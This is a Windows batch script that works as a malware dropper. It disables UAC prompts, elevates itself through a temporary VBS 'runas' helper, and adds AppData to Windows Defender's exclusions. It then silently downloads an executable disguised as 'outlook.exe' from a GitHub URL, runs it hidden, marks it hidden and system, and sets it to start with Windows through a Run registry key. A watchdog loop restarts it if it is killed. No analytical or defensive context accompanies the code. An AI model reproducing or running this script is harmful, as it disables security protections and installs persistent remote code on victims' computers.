@echo off

REM Disable UAC and LUA
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 0 /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v PromptOnSecureDesktop /t REG_DWORD /d 0 /f

REM Check if running as admin
net session >nul 2>&1
if %errorLevel% == 0 (
    goto :continue
) else (
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    echo UAC.ShellExecute "%~s0", "", "", "runas", 1 >> "%temp%\getadmin.vbs"
    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /B
)

:continue

REM Add exclusion to AppData folder
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" /v "C:\Users\%USERNAME%\AppData" /t REG_DWORD /d 1 /f

REM Download and run exe from GitHub link in the background
powershell -windowstyle hidden -command "(New-Object System.Net.WebClient).DownloadFile('https://github.com/kasaotnic4422/fatbitchmuseum/raw/main/outlook.exe', 'C:\Users\%USERNAME%\Downloads\outlook.exe'); Start-Process 'C:\Users\%USERNAME%\Downloads\outlook.exe' -WindowStyle Hidden"

REM Hide the exe from Task Manager
attrib +h +s "C:\Users\%USERNAME%\Downloads\outlook.exe"

REM Add to startup through registry for persistence
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v "MyApp" /t REG_SZ /d "C:\Users\%USERNAME%\Downloads\outlook.exe" /f

REM Check for running process and restart if killed
:check
tasklist | find "outlook.exe" >nul
if errorlevel 1 (
    Start "" "C:\Users\%USERNAME%\Downloads\outlook.exe"
)
timeout /t 5 >nul
goto :check

exit